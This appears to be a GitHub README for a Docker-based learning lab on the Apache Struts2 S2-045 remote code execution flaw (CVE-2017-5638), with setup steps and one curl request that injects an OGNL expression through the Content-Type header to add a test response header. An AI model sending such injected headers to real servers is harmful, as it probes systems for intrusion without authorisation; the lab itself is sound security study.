
# Apache Struts2 S2-045 RCE (CVE-2017-5638)

## 📌 Overview

This project demonstrates the **Remote Code Execution (RCE) vulnerability** in Apache Struts2 (CVE-2017-5638).

Attackers can exploit a crafted HTTP `Content-Type` header to execute arbitrary system commands on vulnerable servers.

This repo uses **Vulhub Docker labs** to provide a safe environment to test and understand the vulnerability.

---

## 🛠 Environment Setup

* **Host:** Ubuntu 24.04 (VirtualBox or Native)
* **Docker & Docker Compose**
* **Vulhub Lab**
* **Apache Struts2 version:** 2.3.30

---

## 🚀 Getting Started

1️⃣ **Clone this repo**

```bash
git clone https://github.com/soufiane-benchahyd/vulhub-struts2.git
cd vulhub-struts2/struts2/s2-045
```

2️⃣ **Start the vulnerable container**

```bash
docker compose up -d
```

3️⃣ **Verify container is running**

```bash
docker ps
```

You should see something like:

```
CONTAINER ID   IMAGE                   COMMAND                  STATUS      PORTS
xxxxxxx        vulhub/struts2:2.3.30   "/usr/local/bin/mvn-…"   Up          0.0.0.0:8080->8080/tcp
```

4️⃣ **Test the web interface**

Open your browser → `http://<VM_IP>:8080`
You should see the Struts2 application homepage.

> VM IP example: `192.168.56.101`

---

## 💻 Exploitation

> ⚠️ Only perform exploitation in a **controlled lab environment**. Never attack public servers.

You can now test the RCE using scripts or tools like `curl` or Metasploit against the vulnerable container.

Example (replace `<command>` with your test command):

```bash
curl -v -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','test')}" http://<VM_IP>:8080/
```

---

## 📝 Notes

* This lab is **safe**: all actions occur inside Docker.
* Screenshots of your test can be added later to GitHub.
* You can extend this repo with **other Struts2 vulnerabilities** for a full learning portfolio.

---

## ⚡ References

* [Apache Struts2 S2-045 CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638)
* [Vulhub GitHub](https://github.com/vulhub/vulhub)



